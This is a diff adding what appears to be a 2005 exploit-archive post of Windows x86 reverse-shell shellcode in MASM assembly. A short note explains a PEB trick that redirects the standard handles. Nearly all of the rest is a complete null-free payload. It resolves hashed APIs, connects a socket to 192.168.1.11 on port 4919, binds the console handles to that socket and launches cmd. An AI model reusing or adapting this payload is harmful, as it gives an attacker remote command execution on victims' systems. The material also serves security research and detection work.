@@ -1,0 +1,214 @@
+We use the PEB for the Output/Input/Error Handles.
+
+typedef struct PEB
+BOOLEAN InheritedAddressSpace ;
+BOOLEAN ReadImageFileExecOptions ;
+BOOLEAN BeingDebugged ;
+BOOLEAN Spare ;
+HANDLE Mutant ;
+PVOID ImageBaseAddress ;
+PPEB LDR DATA LoaderData ;
+PRTL USER PROCESS PARAMETERS ProcessParameters ;
+...
+typedef struct RTL USER PROCESS PARAMETERS
+ULONG MaximumLength ;
+ULONG Length ;
+ULONG Flags ;
+ULONG DebugFlags ;
+PVOID ConsoleHandle ;
+ULONG ConsoleFlags ;
+HANDLE StdInputHandle ; +18h
+HANDLE StdOutputHandle ; +1Ch
+HANDLE StdErrorHandle ; +20h
+...
+
+So with the nooil tricks we have now :
+mov eax,dword ptr fs :[18h]
+mov eax,dword ptr ds :[eax+30h]
+mov eax,dword ptr ds :[eax+10h]
+mov ecx, hClientSocket
+mov dword ptr ds :[eax+18h],ecx ; SetStdHandle(STD INPUT HANDLE,hClientSocket) ;
+mov dword ptr ds :[eax+1Ch],ecx ; SetStdHandle(STD OUTPUT HANDLE,hClientSocket) ;
+mov dword ptr ds :[eax+20h],ecx ; SetStdHandle(STD ERROR HANDLE,hClientSocket) ;
+
+249 bytes Reverse Generic Shellcode without loader(no null byte) :
+
+comment *
+-----------------------------------------------------------------
+---- New generation shellcode using my "nooil tricks" methods ---
+----    (c) 2005 - Matthieu Suiche / msuiche@gmail.com        ---
+249 bytes Reverse Generic Shellcode without loader(no null byte)
+-----------------------------------------------------------------
+hehe hi metasploit's guys ;)
+*
+.386
+.model flat, stdcall
+
+assume fs:nothing
+
+LoadLibraryA    equ 0D6C3D898h
+WSAStartupA     equ 0C7B3B4CBh
+WSASocketA      equ 0B8ACB6C6h
+connect                 equ 06EE2D2C8h
+system                  equ 0E873E6D8h
+ExitProcessA    equ 0D7D8EA95h
+; ------------------------------
+sin_addr                equ 0B01A8C0h ; 192.168.1.11
+sin_port                equ 3713h       ; 4919
+; ------------------------------
+str_cmd                 equ 0FF646D63h
+
+; ----------------------------------------------------
+_nooil_ segment public ; writable section
+;.
+; ----- CODE -----
+scode:
+       jmp short _eip
+       GetEip:
+       pop             edi
+       jmp short EntryPoint
+_eip:
+       call    GetEip
+Kernel32BaseAddr:
+       pushad
+       test    eax, eax
+       jnz             MyGetProcAddr
+       ; eax = 0
+       mov     eax, dword ptr fs:[eax+30h]
+       mov     eax, dword ptr ds:[eax+0ch]
+       mov     esi, dword ptr ds:[eax+1ch]
+       lodsd
+       mov     eax, dword ptr ds:[eax+08h]
+MyGetProcAddr:
+       mov             edx, eax
+
+; - PE
+       add             edx, dword ptr ds:[edx+3ch]
+
+; - Export Table
+       mov             edx, dword ptr ds:[edx+78h]
+       add             edx, eax
+
+       mov     ebx, dword ptr ds:[edx+20h]
+       add             ebx, eax
+
+       xor             ecx, ecx
+       mov             ebp, eax
+
+FindAddr:
+       inc             ecx
+       mov     edi, dword ptr ds:[ebx+ecx*4]
+       add             edi, eax
+
+       mov             esi, dword ptr [edi]
+       add             esi, dword ptr [edi+4]
+       cmp             esi, [esp+36]
+       jz              AddrFound
+       jmp             short FindAddr
+
+AddrFound:
+
+       mov     ebx, dword ptr ds:[edx+24h]
+       add     ebx, ebp
+       mov     cx,word ptr ds:[ebx+ecx*2]
+
+       mov     ebx, dword ptr ds:[edx+1Ch]
+       add     ebx, ebp
+       add     ebp, dword ptr ds:[ebx+ecx*4]
+
+       mov             dword ptr [esp+28], ebp
+       popad
+       retn
+
+EntryPoint:
+       xor             eax, eax
+       xor             ecx, ecx
+       push    LoadLibraryA
+       call    edi                                                     ; MyGetProcAddr(LoadLibraryA);
+       mov             ebp, eax
+
+       push    cx
+       push    word ptr '23'
+       push    '_2sw'
+       push    esp
+       call    eax             ; LoadLibraryA("ws2_32");
+
+       mov             ebx, eax
+
+       push    WSAStartupA
+       call    edi             ; MyGetProcAddr(WSAStartupA)
+
+
+       mov             esi, esp
+       add             si, -301h
+       push    esi
+       push    2
+       call    eax             ; WSAStartup(2,&WSAstruct);
+
+       mov             eax, ebx
+
+       push    WSASocketA
+       call    edi             ; MyGetProcAddr(WSASocketA);
+
+       xor             esi, esi
+       push    esi
+       push    esi
+       push    esi
+       push    esi
+       inc             esi
+       push    esi
+       inc             esi
+       push    esi
+       call    eax             ; WSASocket(2,1,0,0,0,0);
+
+       xchg    ebx, eax ; ebx = sockfd , eax = ws2_32
+
+       push    sin_addr
+       push    word ptr sin_port
+       push    si
+       mov             esi, esp
+
+       push    connect
+       call    edi             ; MyGetProcAddr(connect)
+
+       push    10h
+       push    esi
+       push    ebx
+       call    eax             ; connect(sockfd, &struct, sizeof(struct));
+
+       push    ax
+       push    word ptr 'tr'
+       push    'cvsm'
+       push    esp
+       call    ebp             ; LoadLibraryA("msvcrt");
+
+       push    system
+       call    edi             ; MyGetProcAddr(system);
+
+       ; ----------------------------- nooil tricks ----------------------------------
+       xor             ecx, ecx
+       mov             ecx,dword ptr fs:[ecx+18h]
+       mov             ecx,dword ptr ds:[ecx+30h]
+       mov             ecx,dword ptr ds:[ecx+10h]
+       mov             dword ptr ds:[ecx+18h],ebx ; SetStdHandle(STD_INPUT_HANDLE,hClient);
+       mov     dword ptr ds:[ecx+1Ch],ebx ; SetStdHandle(STD_OUTPUT_HANDLE,hClient);
+       mov     dword ptr ds:[ecx+20h],ebx ; SetStdHandle(STD_ERROR_HANDLE,hClient);
+       ; -----------------------------------------------------------------------------
+
+
+       push    str_cmd
+       inc             byte ptr [esp+3]
+       push    esp
+       call    eax     ; system("cmd");
+
+       ; Exit
+       push    ExitProcessA
+       call    edi             ; MyGetProcAddr(ExitProcessA)
+       call    eax             ; ExitProcessA();
+end scode
+; ------ END CODE ------
+;.
+_nooil_ ends
+; ----------------------------------------------------
+
+; milw0rm.com [2005-08-16]
